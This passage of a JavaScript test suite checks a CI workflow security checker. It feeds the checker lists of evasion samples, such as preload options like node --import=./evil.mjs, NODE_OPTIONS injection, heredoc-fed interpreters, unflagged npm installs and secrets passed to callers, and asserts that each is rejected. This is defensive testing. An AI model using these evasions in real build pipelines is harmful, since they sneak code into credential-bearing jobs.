		assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`job '${jobId}'`) && problem.includes("continue-on-error")), jobId);
	}
	assert.deepEqual(checkWorkflows(), []);
});

test("no caller may pass secrets, an environment or an undeclared input to the standalone workflow (round 4, finding 5)", () => {
	const callerLine = "    uses: ./.github/workflows/standalone-binaries.yml\n";
	for (const [path, extra, expected] of [
		[RELEASE, "    secrets: inherit\n", "passes secrets"],
		[RELEASE, "    secrets:\n      TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}\n", "passes secrets"],
		[RELEASE, "    secrets:\n      TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "passes secrets"],
		[RELEASE, "    secrets: {}\n", "passes secrets"],
		[RELEASE, "    environment: release-r2\n", "in an environment"],
		[CI, "    secrets: inherit\n", "passes secrets"],
		[CI, "    with:\n      build_ref: ${{ github.sha }}\n      extra: x\n", "passes input 'extra'"],
	]) {
		const broken = mutate(path, (text) => text.replace(callerLine, `${callerLine}${extra}`));
		const problems = checkWorkflows(reader({ [path]: broken }));
		assert.ok(problems.some((problem) => problem.startsWith(`${path}: job 'standalone'`) && problem.includes(expected)), `${path} + ${JSON.stringify(extra)}:\n${problems.join("\n")}`);
	}
});

const HEREDOC_EVASIONS = [
	["python3 - from a heredoc", "python3 - <<'PY'\nprint(1)\nPY", /python3 reads its script from a heredoc/],
	["python3 from an unquoted heredoc", "python3 <<PY\nprint(1)\nPY", /python3 reads its script from a heredoc/],
	["node - from a heredoc", "node - <<'JS'\nconsole.log(1)\nJS", /node reads its script from a heredoc/],
	["node from a heredoc", "node <<'JS'\nconsole.log(1)\nJS", /node reads its script from a heredoc/],
	["node from a <<- heredoc", "node <<-JS\n\tconsole.log(1)\n\tJS", /node reads its script from a heredoc/],
	["perl from a heredoc", "perl <<'PL'\nprint 1\nPL", /perl reads its script from a heredoc/],
	["node from a here-string", "node <<<'console.log(1)'", /node reads its script from a here-string/],
	["node from stdin", "node -", /node reads its script from stdin/],
	["python3 from stdin", "python3 - x", /python3 reads its script from stdin/],
	["a heredoc body that names repository code, fed to cat", "cat <<'EOF' > /tmp/x\nnode scripts/release.mjs\nEOF", /references the checkout: scripts\/release\.mjs/],
	["a heredoc body that names repository code, fed to tee", "tee /tmp/x <<EOF\nbash .github/scripts/x.sh\nEOF", /references the checkout: \.github\/scripts\/x\.sh/],
	// The pre-existing evasion: a here-string looked like a heredoc opener and swallowed the rest of the script.
	["a here-string followed by repository code", 'jq -r .ref <<<"$ref"\nnode scripts/release.mjs', /references the checkout: scripts\/release\.mjs/],
	["a quoted here-string followed by repository code", "jq -r .ref <<<'EOF'\nnode scripts/release.mjs", /references the checkout: scripts\/release\.mjs/],
	["a here-string on a numbered fd followed by repository code", 'cat 3<<<"x"\nnode scripts/release.mjs', /references the checkout: scripts\/release\.mjs/],
];

test("every heredoc body is inspected and no interpreter may read one (round 4, finding 6)", () => {
	for (const [label, script, pattern] of HEREDOC_EVASIONS) {
		const reasons = credentialStepReasons(script, { artifactDirectories: ["artifacts"] });
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The here-string no longer opens a heredoc: the following commands are parsed as commands.
	assert.deepEqual([...shellCommands('jq -r .ref <<<"$ref"\necho after')].map((command) => command.words.map((word) => word.text)), [["jq", "-r", ".ref"], ["echo", "after"]]);
	// Two heredocs on one line are both consumed, in order, and both bodies are inspected.
	const two = [...shellCommands("cat <<A <<B\nnode scripts/a.mjs\nA\nbash scripts/b.sh\nB\necho done")];
	assert.deepEqual(two.map((command) => command.words.map((word) => word.text)), [["cat"], ["node", "scripts/a.mjs"], ["bash", "scripts/b.sh"], ["echo", "done"]]);
	// A heredoc fed to something harmless with a harmless body is fine.
	assert.deepEqual(credentialStepReasons("cat <<'EOF' > /tmp/notes.md\nRelease notes\nEOF\necho ok"), []);
});

const INTERPRETER_EVASIONS = [
	["node --import=", "node --import=./evil.mjs -e 1", /node carries an option the checker does not allow.*--import=\.\/evil\.mjs/],
	["node --import", "node --import ./evil.mjs -e 1", /node carries an option the checker does not allow.*--import/],
	["node --require", "node --require ./evil.js -e 1", /node carries an option the checker does not allow.*--require/],
	["node -r", "node -r ./evil.js -e 1", /node carries an option the checker does not allow.*-r/],
	["node --loader", "node --loader ./evil.mjs -e 1", /node carries an option the checker does not allow.*--loader/],
	["node --experimental-loader", "node --experimental-loader=./evil.mjs -e 1", /node carries an option the checker does not allow.*--experimental-loader/],
	["node --env-file", "node --env-file=.env -e 1", /node carries an option the checker does not allow.*--env-file/],
	["node --run", "node --run build", /node carries an option the checker does not allow.*--run/],
	["node --test", "node --test", /node carries an option the checker does not allow.*--test/],
	["NODE_OPTIONS as a prefix", "NODE_OPTIONS=--import=./evil.mjs node -e 1", /sets NODE_OPTIONS, which loads code before the command runs/],
	["NODE_OPTIONS through env", "env NODE_OPTIONS=--import=./evil.mjs node -e 1", /sets NODE_OPTIONS, which loads code before the command runs/],
	["NODE_OPTIONS exported", "export NODE_OPTIONS=--import=./evil.mjs", /sets NODE_OPTIONS, which loads code before the command runs/],
	["NODE_OPTIONS declared", "declare -x NODE_OPTIONS=--require=./evil.js", /sets NODE_OPTIONS/],
	["NODE_OPTIONS read", "read -r NODE_OPTIONS < /tmp/x", /sets NODE_OPTIONS/],
	["NODE_OPTIONS through sudo env", "sudo env NODE_OPTIONS=--import=./evil.mjs node -e 1", /sets NODE_OPTIONS/],
	["PYTHONSTARTUP", "PYTHONSTARTUP=./evil.py python3 -c 1", /sets PYTHONSTARTUP/],
	["PERL5OPT", "PERL5OPT=-M./evil perl -e 1", /sets PERL5OPT/],
	["python3 -m", "python3 -m scripts.evil", /python3 carries an option the checker does not allow.*-m/],
	["python3 -m http.server", "python3 -m http.server 8080", /python3 carries an option the checker does not allow/],
	["python3 -I", "python3 -I -c 1", /python3 carries an option the checker does not allow/],
	["perl -M", "perl -Mscripts::evil -e 1", /perl carries an option the checker does not allow/],
	["ruby -r", "ruby -r./evil -e 1", /ruby carries an option the checker does not allow/],
	["node -e from an expansion", 'node -e "$CODE"', /node -e runs code from an expansion/],
	["python3 -c from an expansion", 'python3 -c "$(cat x)"', /python3 -c runs code from an expansion/],
	["node -e with nothing", "node -e", /node -e names no inline code/],
	["an option built from an expansion", 'node "--$FLAG" -e 1', /node carries an option built from an expansion/],
	["an argument built from an expansion", 'node "$FLAG" x', /runs a file through node: \$FLAG/],
	["node -- file", "node -- evil.js", /runs a file through node: evil\.js/],
	["bash --rcfile", "bash --rcfile ./evil -i", /bash --rcfile runs inline or piped shell code/],
	["bash -i", "bash -i", /bash -i runs inline or piped shell code/],
	["sh -", "sh -", /sh reads its script from stdin/],
	["deno run", "deno run evil.ts", /runs a file through deno: run/],
];

test("interpreters may carry only the inline-code flag; preload and module options are refused before the flag skip (round 4, finding 7)", () => {
	const flagged = (line) => [...shellCommands(line)].flatMap((command) => repositoryCodeReasons(command));
	for (const [label, script, pattern] of INTERPRETER_EVASIONS) {
		const reasons = flagged(script);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	for (const fine of ["node -e 'console.log(1)'", "node --eval 'console.log(1)'", "node -p '1 + 1'", "node --version", "node -v", "python3 -c 'print(1)'", "python3 --version", "perl -e 'print 1'", "ruby -e 'puts 1'", "bash --version"]) {
		assert.deepEqual(flagged(fine), [], fine);
	}
});

for (const jobId of ["publish-r2", "finalize-release", "publish-npm", "tap-bump"]) {
	test(`heredoc and interpreter-option evasions inside credential-bearing job ${jobId} are rejected in the workflow (round 4, findings 6 and 7)`, () => {
		for (const [label, script, pattern] of [...HEREDOC_EVASIONS, ...INTERPRETER_EVASIONS]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in code", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	});
}

test("--ignore-scripts counts only when it is enabled (round 4, finding 8)", () => {
	for (const args of [["--ignore-scripts"], ["--ignore-scripts", "true"], ["--ignore-scripts=true"], ["--foo", "--ignore-scripts", "bar"], ["--ignore-scripts", "--other"]]) {
		assert.equal(ignoreScriptsEnabled(args), true, args.join(" "));
	}
	for (const args of [[], ["--ignore-scripts", "false"], ["--ignore-scripts=false"], ["--ignore-scripts=0"], ["--ignore-scripts=no"], ["--ignore-scripts", "0"], ["--no-ignore-scripts"], ["--ignore-scripts", "--ignore-scripts=false"], ["--ignore-scripts=false", "--ignore-scripts"], ["--ignore-script"], ["--ignore-scripts-not"]]) {
		assert.equal(ignoreScriptsEnabled(args), false, args.join(" "));
	}
	for (const disabled of ["npm ci --ignore-scripts false", "npm ci --ignore-scripts=false", "npm ci --no-ignore-scripts", "npm ci --ignore-scripts=0", "npm ci --ignore-scripts --ignore-scripts=false"]) {
		const broken = mutate(STANDALONE, (text) => text.replace("run: npm ci --ignore-scripts\n", `run: ${disabled}\n`));
		const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
		assert.ok(problems.some((problem) => problem.includes("--ignore-scripts") && problem.includes(disabled)), `${disabled}:\n${problems.join("\n")}`);
	}
	// npm publish in the credential-bearing publish job must keep its --ignore-scripts too.
	for (const disabled of ['npm publish "$path" --provenance --access public --ignore-scripts=false', 'npm publish "$path" --provenance --access public']) {
		const broken = mutate(RELEASE, (text) => text.replace('npm publish "$path" --provenance --access public --ignore-scripts', disabled));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes("'publish-npm'") && problem.includes("npm publish runs the package's publish lifecycle scripts")), `${disabled}:\n${problems.join("\n")}`);
	}
});

const LIFECYCLE_EVASIONS = [
	["npm install", "npm install", /npm install runs dependency lifecycle scripts without --ignore-scripts/],
	["npm i", "npm i", /npm i runs dependency lifecycle scripts/],
	["npm install --global", "npm install --global npm@12", /npm install runs dependency lifecycle scripts/],
	["npm install with a disabled flag", "npm install --ignore-scripts=false", /npm install runs dependency lifecycle scripts/],
	["npm ci", "npm ci", /npm ci runs dependency lifecycle scripts/],
	["npm update", "npm update", /npm update runs dependency lifecycle scripts/],
	["npm link", "npm link", /npm link runs dependency lifecycle scripts/],
	["npm exec", "npm exec -- prime-agent", /npm exec runs dependency lifecycle scripts/],
	["npm x", "npm x tsx x.ts", /npm x runs dependency lifecycle scripts/],
	["npm prune", "npm prune --production", /npm prune runs dependency lifecycle scripts/],
	["npm dedupe", "npm dedupe", /npm dedupe runs dependency lifecycle scripts/],
	["npm audit fix", "npm audit fix", /npm audit runs dependency lifecycle scripts/],
	["npm rebuild (all)", "npm rebuild", /npm rebuild runs install scripts; only the literal 'npm rebuild esbuild' is allowed/],
	["npm rebuild another package", "npm rebuild koffi", /only the literal 'npm rebuild esbuild'/],
	["npm rebuild two packages", "npm rebuild esbuild koffi", /only the literal 'npm rebuild esbuild'/],
	["npm rebuild esbuild with a flag", "npm rebuild esbuild --foreground-scripts", /only the literal 'npm rebuild esbuild'/],
	["npm rebuild esbuild --ignore-scripts (pointless)", "npm rebuild esbuild --ignore-scripts", /only the literal 'npm rebuild esbuild'/],
	["npm rb", "npm rb esbuild", /only the literal 'npm rebuild esbuild'/],
	["npm with config before the subcommand", "npm --prefix x install", /npm carries options before its subcommand/],
	["npm with config that hides the subcommand", "npm --prefix foo install", /npm carries options before its subcommand/],
	["yarn v1 install through a flag alone", "yarn --frozen-lockfile", /yarn carries options before its subcommand/],
	["npx", "npx tsx x.ts", /npx may install and run a package's lifecycle scripts/],
	["npx --yes", "npx --yes some-package", /npx may install/],
	["npx with a disabled flag", "npx --ignore-scripts=false tsx x.ts", /npx may install/],
	["bunx", "bunx tsx x.ts", /bunx installs and runs code from a registry/],
	["yarn", "yarn", /yarn {2}runs dependency lifecycle scripts|yarn runs dependency lifecycle scripts/],
	["yarn install", "yarn install --frozen-lockfile", /yarn install runs dependency lifecycle scripts/],
	["yarn add", "yarn add x", /yarn add runs dependency lifecycle scripts/],
	["yarn dlx", "yarn dlx tsx", /yarn dlx runs dependency lifecycle scripts/],
	["pnpm install", "pnpm install", /pnpm install runs dependency lifecycle scripts/],
	["pnpm i", "pnpm i --frozen-lockfile", /pnpm i runs dependency lifecycle scripts/],
	["pnpm dlx", "pnpm dlx tsx", /pnpm dlx runs dependency lifecycle scripts/],
	["bun install", "bun install", /bun install runs dependency lifecycle scripts/],
	["bun add", "bun add x", /bun add runs dependency lifecycle scripts/],
	["bun x", "bun x tsx", /bun x runs dependency lifecycle scripts/],
	["pip install", "pip install requests", /pip installs and runs code from a registry/],
	["pip3 install", "pip3 install requests", /pip3 installs and runs code from a registry/],
	["uvx", "uvx ruff", /uvx installs and runs code from a registry/],
	["uv pip install", "uv pip install requests", /uv pip runs dependency lifecycle scripts/],
	["uv sync", "uv sync", /uv sync runs dependency lifecycle scripts/],
	["uv run", "uv run x.py", /uv run runs dependency lifecycle scripts/],
	["npm through a path", "/usr/local/bin/npm ci --ignore-scripts", /invokes npm through a path or expansion/],
	["a subcommand from an expansion", 'npm "$SUB"', /npm runs a subcommand built from an expansion/],
	["inside a command substitution", "out=$(npm install)", /inside a command substitution: npm install runs dependency lifecycle scripts/],
	["after a continuation", "npm \\\n  install", /npm install runs dependency lifecycle scripts/],
	["with an assignment prefix", "CI=1 npm install", /npm install runs dependency lifecycle scripts/],
];

test("every lifecycle-running package-manager command is refused on a build runner unless --ignore-scripts is enabled (round 4, finding 9)", () => {
	const build = { workflow: RELEASE, jobId: "build" };
	for (const [label, script, pattern] of LIFECYCLE_EVASIONS) {
		const reasons = [...shellCommands(script)].flatMap((command) => lifecycleReasons(command, build));
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The literal rebuild is allowed in the allowlisted jobs only.
	assert.deepEqual(REBUILD_ALLOWLIST.command, ["npm", "rebuild", "esbuild"]);
	assert.deepEqual(Object.keys(REBUILD_ALLOWLIST.jobs), [RELEASE, STANDALONE]);
	for (const [workflow, jobs] of Object.entries(REBUILD_ALLOWLIST.jobs)) {
		for (const jobId of jobs) assert.deepEqual([...shellCommands("npm rebuild esbuild")].flatMap((command) => lifecycleReasons(command, { workflow, jobId })), [], `${workflow} ${jobId}`);
	}
	for (const location of [{ workflow: RELEASE, jobId: "assemble" }, { workflow: RELEASE, jobId: "publish-npm" }, { workflow: STANDALONE, jobId: "other" }, {}]) {
		assert.match([...shellCommands("npm rebuild esbuild")].flatMap((command) => lifecycleReasons(command, location)).join("\n"), /only the literal 'npm rebuild esbuild' is allowed, and only in/);
	}
	// What the checked-in build jobs do is accepted, one construct at a time.
	for (const fine of [
		"npm ci --ignore-scripts",
		"npm install --global --ignore-scripts npm@12.0.2",
		"npm install --ignore-scripts=true",
		"npx --ignore-scripts tsx ../../node_modules/vitest/dist/cli.js --run test/x.test.ts",
		"pnpm install --ignore-scripts",
		"bun install --ignore-scripts",
		"yarn install --ignore-scripts",
		"npm run build",
		"npm run release:pack -- --channel stable",
		"npm --version",
		"npm view prime-agent version",
		"npm publish x.tgz --provenance --access public --ignore-scripts",
		"corepack enable",
		"uv --version",
		"echo npm install",
	]) {
		assert.deepEqual([...shellCommands(fine)].flatMap((command) => lifecycleReasons(command, build)), [], fine);
	}
	// ...and the workflow-level check reaches every job of both build workflows.
	for (const [path, jobId] of [[RELEASE, "build"], [RELEASE, "assemble"], [RELEASE, "validate-macos"], [RELEASE, "pack-npm"], [RELEASE, "publish-npm"], [STANDALONE, "build"]]) {
		for (const [label, script, pattern] of LIFECYCLE_EVASIONS) {
			const broken = mutate(path, (text) => appendStep(text, jobId, runStep("Sneak in an install", script)));
			const problems = checkWorkflows(reader({ [path]: broken }));
			assert.ok(problems.some((problem) => problem.startsWith(`${path}: job '${jobId}'`) && pattern.test(problem)), `${label} in ${path} ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	}
	// `npm rebuild esbuild` outside the allowlisted jobs is rejected in the workflow as well.
	const broken = mutate(RELEASE, (text) => appendStep(text, "assemble", runStep("Rebuild here", "npm rebuild esbuild")));
	assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes("'assemble'") && problem.includes("only the literal 'npm rebuild esbuild'")));
	// The checked-in workflows carry no unflagged install anywhere.
	for (const path of [RELEASE, STANDALONE]) {
		const workflow = parse(readFileSync(path, "utf8"));
		for (const [jobId, job] of Object.entries(workflow.jobs)) {
			for (const step of job.steps ?? []) {
				for (const command of shellCommands(String(step.run ?? ""))) assert.deepEqual(lifecycleReasons(command, { workflow: path, jobId }), [], `${path} ${jobId} ${step.name}`);
			}
		}
	}
});

const HEAD_OBJECT_STEP = `set -euo pipefail
for file in artifacts/*; do
  name=$(basename "$file")
  key="releases/v\${PRODUCTION_VERSION}/\${name}"
  ${HEAD_OBJECT_GUARD.reset}
  aws s3api head-object --bucket "$R2_BUCKET" --key "$key" \\
    --endpoint-url "$R2_ENDPOINT_URL" >/tmp/head.json 2>${HEAD_OBJECT_GUARD.errorFile} || ${HEAD_OBJECT_GUARD.capture}
  ${HEAD_OBJECT_GUARD.exists}
    echo "unchanged \${key}"
    continue
  ${HEAD_OBJECT_GUARD.absent}
    echo "absent \${key}"
  else
    echo "head-object failed" >&2
    cat /tmp/head.err >&2
    exit 1
  fi
  aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/\${name}" --quiet
done`;

test("aws s3api head-object may treat only an explicit 404 as absent (round 4, finding 10)", () => {
	assert.deepEqual(headObjectGuardReasons(HEAD_OBJECT_STEP), []);
	assert.deepEqual(headObjectGuardReasons("set -euo pipefail\naws s3 cp a s3://b/c"), []); // no head-object: nothing to guard
	const variants = [
		["head-object as an if condition", (text) => text.replace(`${HEAD_OBJECT_GUARD.reset}\n  aws s3api`, "if aws s3api").replace(` || ${HEAD_OBJECT_GUARD.capture}\n  ${HEAD_OBJECT_GUARD.exists}`, "; then"), /uses aws s3api head-object as a condition/],
		["a negated condition", (text) => text.replace("  aws s3api", "  ! aws s3api"), /uses aws s3api head-object as a condition/],
		["stderr discarded", (text) => text.replace(`2>${HEAD_OBJECT_GUARD.errorFile}`, "2>/dev/null"), /must keep the stderr of aws s3api head-object in \/tmp\/head\.err/],
		["stderr merged into stdout", (text) => text.replace(`2>${HEAD_OBJECT_GUARD.errorFile}`, "2>&1"), /must keep the stderr/],
		["stderr to another file", (text) => text.replace(`2>${HEAD_OBJECT_GUARD.errorFile}`, "2>/tmp/other.err"), /must keep the stderr/],
		["no stderr redirection", (text) => text.replace(` 2>${HEAD_OBJECT_GUARD.errorFile}`, ""), /must keep the stderr/],
		["no status reset", (text) => text.replace(`  ${HEAD_OBJECT_GUARD.reset}\n`, ""), /must reset 'head_status=0' immediately before/],
		["a stale status from the previous iteration", (text) => text.replace(`  ${HEAD_OBJECT_GUARD.reset}\n`, "  true\n"), /must reset 'head_status=0' immediately before/],
		["no status capture", (text) => text.replace(` || ${HEAD_OBJECT_GUARD.capture}`, " || true"), /must capture the exit status with '\|\| head_status=\$\?' immediately after/],
		["any non-zero status treated as absent", (text) => text.replace(HEAD_OBJECT_GUARD.absent, 'elif [ "$head_status" -ne 0 ]; then'), /must accept only an explicit 404 as "absent", spelled exactly/],
		["a 404 accepted without the exit code", (text) => text.replace(HEAD_OBJECT_GUARD.absent, "elif grep -q 404 /tmp/head.err; then"), /must accept only an explicit 404/],
		["a 403 accepted as absent", (text) => text.replace("(404|NotFound|NoSuchKey)", "(403|404|NotFound|NoSuchKey)"), /must accept only an explicit 404/],
		["the exists test loosened", (text) => text.replace(HEAD_OBJECT_GUARD.exists, 'if [ "$head_status" -ne 254 ]; then'), /must test the head-object status with exactly/],
		["the else branch dropped", (text) => text.replace("  else\n    echo \"head-object failed\" >&2\n    cat /tmp/head.err >&2\n    exit 1\n", ""), /must end the head-object guard with an 'else' branch that exits 1/],
		["the else branch does not exit", (text) => text.replace("    exit 1\n  fi", "    echo continuing anyway\n  fi"), /must end the head-object guard with an 'else' branch that exits 1/],
		["another elif branch", (text) => text.replace("  else\n", '  elif [ "$head_status" -eq 403 ]; then\n    echo absent\n  else\n'), /must not add another branch to the head-object guard/],
		["head_status reassigned elsewhere", (text) => text.replace("  fi\n", "  fi\n  head_status=254\n"), /assigns head_status outside the head-object guard/],
		["no set -e", (text) => text.replace("set -euo pipefail\n", "set -uo pipefail\n"), /must start with 'set -euo pipefail'/],
	];
	for (const [label, mutateText, pattern] of variants) {
		const broken = mutateText(HEAD_OBJECT_STEP);
		assert.notEqual(broken, HEAD_OBJECT_STEP, `${label}: the mutation changed nothing`);
		const reasons = headObjectGuardReasons(broken);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// Both checked-in upload loops carry the guard, and loosening either is a workflow failure.
	const release = parse(readFileSync(RELEASE, "utf8"));
	for (const [jobId, stepName] of [["publish-r2", "Upload immutable release objects"], ["publish-beta-r2", "Upload immutable beta objects"]]) {
		const step = release.jobs[jobId].steps.find((entry) => entry.name === stepName);
		assert.ok(step.run.includes(HEAD_OBJECT_GUARD.absent), `${jobId} carries the guard`);
		assert.deepEqual(headObjectGuardReasons(step.run), [], jobId);
		for (const [label, from, to, pattern] of [
			["discarding stderr", `2>${HEAD_OBJECT_GUARD.errorFile} || ${HEAD_OBJECT_GUARD.capture}`, `2>/dev/null || ${HEAD_OBJECT_GUARD.capture}`, /must keep the stderr/],
			["treating every failure as absent", HEAD_OBJECT_GUARD.absent, 'elif [ "$head_status" -ne 0 ]; then', /must accept only an explicit 404/],
			["dropping the reset", `            ${HEAD_OBJECT_GUARD.reset}\n`, "", /must reset 'head_status=0'/],
			["continuing on another error", "              cat /tmp/head.err >&2\n              exit 1\n", "              cat /tmp/head.err >&2\n", /'else' branch that exits 1/],
		]) {
			const broken = mutate(RELEASE, (text) => {
				const start = text.indexOf(`\n  ${jobId}:\n`);
				const index = text.indexOf(from, start);
				assert.ok(index > start, `${jobId} contains ${from}`);
				return `${text.slice(0, index)}${to}${text.slice(index + from.length)}`;
			});
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	}
});

test("every caller of the standalone workflow - ci.yml included - passes exactly contents:read and id-token:write and no secret (round 4, finding 11)", () => {
	const ci = parse(readFileSync(CI, "utf8"));
	assert.equal(ci.jobs.standalone.uses, `./${STANDALONE}`);
	assert.deepEqual(ci.jobs.standalone.permissions, { contents: "read", "id-token": "write" });
	assert.equal("secrets" in ci.jobs.standalone, false);
	const callerPermissions = "    permissions:\n      contents: read\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml\n";
	for (const [label, replacement, expected] of [
		["no permissions", "    uses: ./.github/workflows/standalone-binaries.yml\n", "(none declared)"],
		["contents only", "    permissions:\n      contents: read\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["id-token only", "    permissions:\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["contents write", "    permissions:\n      contents: write\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["an extra scope", "    permissions:\n      contents: read\n      id-token: write\n      packages: write\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["write-all", "    permissions: write-all\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["empty permissions", "    permissions: {}\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["secrets inherit", `${callerPermissions}    secrets: inherit\n`, "passes secrets"],
	]) {
		for (const path of [CI, RELEASE]) {
			const broken = mutate(path, (text) => text.replace(callerPermissions, replacement));
			const problems = checkWorkflows(reader({ [path]: broken }));
			assert.ok(problems.some((problem) => problem.startsWith(`${path}: job 'standalone'`) && problem.includes(expected)), `${label} in ${path}:\n${problems.join("\n")}`);
		}
	}
	// A caller in any other workflow file is validated the same way.
	const extra = "on: push\njobs:\n  sneaky:\n    secrets: inherit\n    uses: ./.github/workflows/standalone-binaries.yml\n";
	const problems = checkWorkflows(reader({ ".github/workflows/extra.yml": extra }), () => ["build-binaries.yml", "ci.yml", "extra.yml"]);
	assert.ok(problems.some((problem) => problem.startsWith(".github/workflows/extra.yml: job 'sneaky'") && problem.includes("passes secrets")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.startsWith(".github/workflows/extra.yml: job 'sneaky'") && problem.includes("must pass exactly")), problems.join("\n"));
});
